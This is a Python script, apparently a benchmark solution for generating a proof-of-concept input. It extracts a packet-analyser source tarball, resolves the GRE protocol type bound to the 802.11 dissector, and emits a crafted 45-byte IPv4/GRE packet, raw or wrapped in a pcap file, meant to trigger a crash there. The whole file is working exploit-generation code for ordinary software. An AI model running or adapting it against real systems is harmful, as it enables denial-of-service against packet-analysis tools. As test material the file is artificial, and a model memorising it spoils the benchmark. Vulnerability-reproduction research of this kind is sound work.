import os
import tarfile
import tempfile
import re
import ast
import struct


def _extract_tarball(src_path: str) -> str:
    tmpdir = tempfile.mkdtemp(prefix="poc_src_")
    with tarfile.open(src_path, 'r:*') as tf:
        tf.extractall(tmpdir)
    return tmpdir


def _read_text_file(path: str) -> str:
    try:
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            return f.read()
    except Exception:
        return ""


def _list_source_files(root: str):
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            lower = fn.lower()
            if lower.endswith(('.c', '.h', '.cc', '.cpp', '.hh', '.hpp')):
                yield os.path.join(dirpath, fn)


def _parse_macros(root: str) -> dict:
    # Parse simple #define MACRO value (numbers only or simple bit operations)
    macros = {}
    define_re = re.compile(r'^\s*#\s*define\s+([A-Za-z_]\w*)\s+(.+)$')
    # Avoid parsing huge expressions; capture simple defines
    for path in _list_source_files(root):
        try:
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    m = define_re.match(line)
                    if not m:
                        continue
                    name = m.group(1)
                    val = m.group(2).strip()
                    # Remove comments
                    val = val.split('/*', 1)[0].split('//', 1)[0].strip()
                    # Drop macro functions and strings
                    if not val:
                        continue
                    if '(' in name and ')' in name:
                        # macro function
                        continue
                    # Accept simple tokens
                    # Ensure value contains only allowed tokens: numbers, hex, shifts, |, &, ~, +, -, parentheses, names
                    if re.match(r'^[\s0-9xa-fA-F\(\)\|\&\^\~\<\>\+\-\*\/%A-Za-z_]+$', val):
                        macros[name] = val
        except Exception:
            continue
    # Now attempt to resolve to integers
    resolved = {}
    # Create evaluation context
    def eval_expr(expr: str, depth=0):
        if depth > 10:
            raise ValueError("Too deep")
        node = ast.parse(expr, mode='eval')

        def _eval(n):
            if isinstance(n, ast.Expression):
                return _eval(n.body)
            if isinstance(n, ast.Num):
                return int(n.n)
            if isinstance(n, ast.Constant):
                if isinstance(n.value, int):
                    return n.value
                # Strings unsupported
                raise ValueError("Unsupported constant")
            if isinstance(n, ast.UnaryOp) and isinstance(n.op, (ast.Invert, ast.UAdd, ast.USub)):
                v = _eval(n.operand)
                if isinstance(n.op, ast.Invert):
                    return ~v
                if isinstance(n.op, ast.UAdd):
                    return +v
                if isinstance(n.op, ast.USub):
                    return -v
            if isinstance(n, ast.BinOp) and isinstance(n.op, (ast.BitOr, ast.BitAnd, ast.BitXor, ast.LShift, ast.RShift, ast.Add, ast.Sub, ast.Mult, ast.Div, ast.FloorDiv, ast.Mod)):
                l = _eval(n.left)
                r = _eval(n.right)
                if isinstance(n.op, ast.BitOr):
                    return l | r
                if isinstance(n.op, ast.BitAnd):
                    return l & r
                if isinstance(n.op, ast.BitXor):
                    return l ^ r
                if isinstance(n.op, ast.LShift):
                    return l << r
                if isinstance(n.op, ast.RShift):
                    return l >> r
                if isinstance(n.op, ast.Add):
                    return l + r
                if isinstance(n.op, ast.Sub):
                    return l - r
                if isinstance(n.op, ast.Mult):
                    return l * r
                if isinstance(n.op, (ast.Div, ast.FloorDiv)):
                    if r == 0:
                        raise ValueError("div by zero")
                    return l // r
                if isinstance(n.op, ast.Mod):
                    if r == 0:
                        raise ValueError("mod by zero")
                    return l % r
            if isinstance(n, ast.Name):
                nm = n.id
                if nm in resolved:
                    return resolved[nm]
                if nm in macros:
                    # Try to resolve recursively
                    val_expr = macros[nm]
                    # Protect against self-reference
                    if val_expr == nm:
                        raise ValueError("self ref")
                    v = eval_expr(val_expr, depth+1)
                    resolved[nm] = v
                    return v
                # Allow common known macros
                known = {
                    'TRUE': 1, 'FALSE': 0
                }
                if nm in known:
                    return known[nm]
                # Unknown name -> fail
                raise ValueError(f"Unknown name {nm}")
            if isinstance(n, ast.Paren) or isinstance(n, ast.Tuple):
                raise ValueError("Unsupported node")
            raise ValueError("Unsupported AST")
        return _eval(node)

    # Try to evaluate macros into integers
    for k, vexpr in list(macros.items()):
        try:
            v = eval_expr(vexpr)
            if isinstance(v, int):
                resolved[k] = v
        except Exception:
            # leave unresolved
            pass
    return resolved


def _find_gre_80211_proto_type(root: str, macros: dict) -> int or None:
    # Search for dissector_add_uint("gre.proto", VALUE, HANDLE) and pick HANDLE related to 802.11
    gre_re = re.compile(r'dissector_add_uint\s*\(\s*"gre\.proto"\s*,\s*([^\),]+)\s*,\s*([^\)\n;]+)\)', re.IGNORECASE)
    candidates = []
    for path in _list_source_files(root):
        text = _read_text_file(path)
        if 'gre.proto' not in text:
            continue
        for m in gre_re.finditer(text):
            val_expr = m.group(1).strip()
            handle = m.group(2).strip()
            # Clean possible trailing chars
            handle = handle.split(')')[0].split(',')[0].strip()
            # Identify 802.11 handle by name keywords
            handle_lower = handle.lower()
            if any(k in handle_lower for k in ('80211', '802_11', 'dot11', 'wlan')):
                candidates.append((path, val_expr, handle))
    if not candidates:
        return None

    # Evaluate value expression
    def safe_eval_value(val_expr: str) -> int or None:
        val_expr_clean = val_expr.strip()
        # Remove casts like (guint16)
        val_expr_clean = re.sub(r'\([A-Za-z_]\w*\s*\*?\)', '', val_expr_clean)
        val_expr_clean = re.sub(r'\([A-Za-z_]\w*\s*\)', '', val_expr_clean)
        # Simple hex or decimal
        try:
            if re.match(r'^0x[0-9A-Fa-f]+$', val_expr_clean):
                return int(val_expr_clean, 16)
            if re.match(r'^[0-9]+$', val_expr_clean):
                return int(val_expr_clean, 10)
        except Exception:
            pass
        # Try to resolve using macros and expression evaluator
        try:
            node = ast.parse(val_expr_clean, mode='eval')

            def _eval(n):
                if isinstance(n, ast.Expression):
                    return _eval(n.body)
                if isinstance(n, ast.Num):
                    return int(n.n)
                if isinstance(n, ast.Constant):
                    if isinstance(n.value, int):
                        return n.value
                    raise ValueError
                if isinstance(n, ast.UnaryOp) and isinstance(n.op, (ast.Invert, ast.UAdd, ast.USub)):
                    v = _eval(n.operand)
                    if isinstance(n.op, ast.Invert):
                        return ~v & 0xFFFFFFFF
                    if isinstance(n.op, ast.UAdd):
                        return +v
                    if isinstance(n.op, ast.USub):
                        return -v
                if isinstance(n, ast.BinOp) and isinstance(n.op, (ast.BitOr, ast.BitAnd, ast.BitXor, ast.LShift, ast.RShift, ast.Add, ast.Sub)):
                    l = _eval(n.left)
                    r = _eval(n.right)
                    if isinstance(n.op, ast.BitOr):
                        return l | r
                    if isinstance(n.op, ast.BitAnd):
                        return l & r
                    if isinstance(n.op, ast.BitXor):
                        return l ^ r
                    if isinstance(n.op, ast.LShift):
                        return l << r
                    if isinstance(n.op, ast.RShift):
                        return l >> r
                    if isinstance(n.op, ast.Add):
                        return l + r
                    if isinstance(n.op, ast.Sub):
                        return l - r
                if isinstance(n, ast.Name):
                    nm = n.id
                    if nm in macros and isinstance(macros[nm], int):
                        return macros[nm]
                    # If macro exists but not resolved to int, try to parse as hex/dec
                    if nm in macros:
                        expr = macros[nm]
                        if isinstance(expr, int):
                            return expr
                    # Accept few common names -> unknown
                    raise ValueError(f"Unknown name {nm}")
                raise ValueError
            val = _eval(node)
            if isinstance(val, int):
                # GRE Proto Type is 16 bits
                return val & 0xFFFF
        except Exception:
            pass
        return None

    for _, val_expr, _ in candidates:
        v = safe_eval_value(val_expr)
        if v is not None:
            return v & 0xFFFF
    return None


def _detect_harness_type(root: str) -> str:
    # Returns 'ip' if fuzz target expects raw IP packets, otherwise 'pcap'
    # Search for LLVMFuzzerTestOneInput and specific API usage
    fuzzer_files = []
    for path in _list_source_files(root):
        text = _read_text_file(path)
        if 'LLVMFuzzerTestOneInput' in text:
            fuzzer_files.append((path, text))
    # Heuristics
    for path, text in fuzzer_files:
        low = text.lower()
        if 'wtap_' in low or 'wiretap' in low or 'pcapng' in low or 'pcap' in low:
            return 'pcap'
        if 'ip' in os.path.basename(path).lower() or 'fuzzshark_ip' in low:
            return 'ip'
        # Look for IP dissection
        if 'proto_ip' in low or 'dissect_ip' in low or 'packet-ip' in low:
            return 'ip'
    # Default to pcap (generic)
    return 'pcap' if fuzzer_files else 'pcap'


def _ip_checksum(header_bytes: bytes) -> int:
    # Compute IPv4 header checksum
    s = 0
    # sum 16-bit words
    for i in range(0, len(header_bytes), 2):
        w = header_bytes[i] << 8
        if i+1 < len(header_bytes):
            w |= header_bytes[i+1]
        s += w
        s = (s & 0xFFFF) + (s >> 16)
    return (~s) & 0xFFFF


def _build_ipv4_gre_packet(gre_proto_type: int, payload_len: int) -> bytes:
    # Build minimal IPv4 packet with GRE carrying a payload that will be handled by 802.11 dissector
    # IPv4 header 20 bytes
    ihl_version = 0x45  # Version 4, IHL 5
    tos = 0x00
    gre_header_len = 4  # base GRE header
    total_len = 20 + gre_header_len + payload_len
    identification = 0x0000
    flags_frag = 0x0000
    ttl = 64
    proto = 47  # GRE
    checksum = 0  # placeholder
    src_ip = struct.pack('!I', 0x0A000001)  # 10.0.0.1
    dst_ip = struct.pack('!I', 0x0A000002)  # 10.0.0.2
    ip_header = struct.pack('!BBHHHBBH4s4s',
                            ihl_version, tos, total_len, identification, flags_frag,
                            ttl, proto, checksum, src_ip, dst_ip)
    checksum = _ip_checksum(ip_header)
    ip_header = struct.pack('!BBHHHBBH4s4s',
                            ihl_version, tos, total_len, identification, flags_frag,
                            ttl, proto, checksum, src_ip, dst_ip)
    # GRE header: Flags/Version = 0x0000, Protocol Type = gre_proto_type
    gre_header = struct.pack('!HH', 0x0000, gre_proto_type & 0xFFFF)
    # Payload content can be arbitrary; ensure length
    # Use repeating pattern that could look like an 802.11 header to encourage processing
    # Minimal 802.11 header is 24 bytes; but we might choose shorter to keep 45-byte total
    payload = bytes((i * 3 + 0x11) & 0xFF for i in range(payload_len))
    return ip_header + gre_header + payload


def _build_pcap_with_ip_packet(ip_packet: bytes) -> bytes:
    # PCAP global header: magic, vmaj=2, vmin=4, thiszone=0, sigfigs=0, snaplen=262144, network=LINKTYPE_RAW=101
    magic = 0xA1B2C3D4
    vmaj = 2
    vmin = 4
    thiszone = 0
    sigfigs = 0
    snaplen = 262144
    linktype_raw = 101
    global_hdr = struct.pack('!IHHIIII', magic, vmaj, vmin, thiszone, sigfigs, snaplen, linktype_raw)
    # Packet header
    ts_sec = 0
    ts_usec = 0
    incl_len = len(ip_packet)
    orig_len = len(ip_packet)
    pkt_hdr = struct.pack('!IIII', ts_sec, ts_usec, incl_len, orig_len)
    return global_hdr + pkt_hdr + ip_packet


class Solution:
    def solve(self, src_path: str) -> bytes:
        root = _extract_tarball(src_path)
        macros = _parse_macros(root)
        gre_proto = _find_gre_80211_proto_type(root, macros)
        # If not found, try some common guesses; these are fallbacks and may or may not trigger
        if gre_proto is None:
            # Try to infer from known macro names if present
            for k, v in macros.items():
                kl = k.lower()
                if isinstance(v, int) and any(t in kl for t in ('80211', '802_11', 'dot11', 'wlan')):
                    gre_proto = v & 0xFFFF
                    break
        if gre_proto is None:
            # As a last resort, try some commonly misused GRE protocol types: 0x0001..0x0010
            # Choose a benign but uncommon value to maximize chance if mis-registered
            gre_proto = 0x0007

        # Build IP+GRE payload
        # Aim for ground-truth size 45: IP(20) + GRE(4) + payload(21) = 45 bytes
        # But ensure payload >= 1
        payload_len = 21
        ip_packet = _build_ipv4_gre_packet(gre_proto, payload_len)

        harness = _detect_harness_type(root)
        if harness == 'ip':
            return ip_packet
        else:
            return _build_pcap_with_ip_packet(ip_packet)
